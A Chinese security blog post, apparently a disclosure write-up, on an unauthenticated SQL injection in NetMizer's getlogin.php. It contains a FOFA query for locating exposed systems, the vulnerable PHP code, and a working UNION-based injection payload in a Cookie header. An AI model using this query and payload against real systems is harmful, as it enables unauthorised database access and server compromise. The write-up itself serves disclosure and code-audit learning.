---
title: "NetMizer日志管理系统 getlogin.php SQL注入漏洞"
source: https://mrxn.net/jswz/netmizer-data-login-getlogin-usersessionid-sqli.html
asset_dir: assets/netmizer日志管理系统-getlogin.php-sql注入漏洞
---

# NetMizer日志管理系统 getlogin.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/12 08:25
- 951浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

软件

服务器

安全

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/login/getlogin.php` 接口处存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的恶意攻击者利用[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `/data/login/getlogin.php` 业务实现关键逻辑部分

```
<?php

    include('../include/JSON.php');
    $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
    mysql_select_db("sysmonitor");

    $usersessionid= $_COOKIE["usersessionid"];
    $sqlstr = "SELECT DISTINCT user_name,login_ip from tbl_admin_session where session_id='$usersessionid' ";
    $res=mysql_query($sqlstr);
    while($row = mysql_fetch_array($res,MYSQL_BOTH)){
       $user_name = $row["user_name"];
       $login_ip = long2ip($row["login_ip"]);
    }
    $str = array("success"=>'success', "usersessionid"=>$user_name, "userip"=>$login_ip);

    $json = json_encode($str);
    mysql_close($conn_id);
    echo $json;

?>
```

深入探索

Windows安全工具

物流软件安全

技术文章订阅

Cookie 里的 `usersessionid` 被直接拼接进SQL语句中，无任何过滤或校验，造成[SQL注入](https://mrxn.net/tag/SQL注入)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

代码安全审计

```
GET /data/login/getlogin.php HTTP/1.1
Host: netmizer.mrxn.net
Cookie: usersessionid=' UNION ALL SELECT CONCAT(0x7e,user(),0x7e),NULL-- -
```

通过union注入，成功得到数据库用户信息

[![NetMizer日志管理系统 getlogin.php SQL注入漏洞](images/img-001-9a9f4280b249.webp)](https://image.mrxn.net/8da5227ecc604ff5b1777ad531dd1e78.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
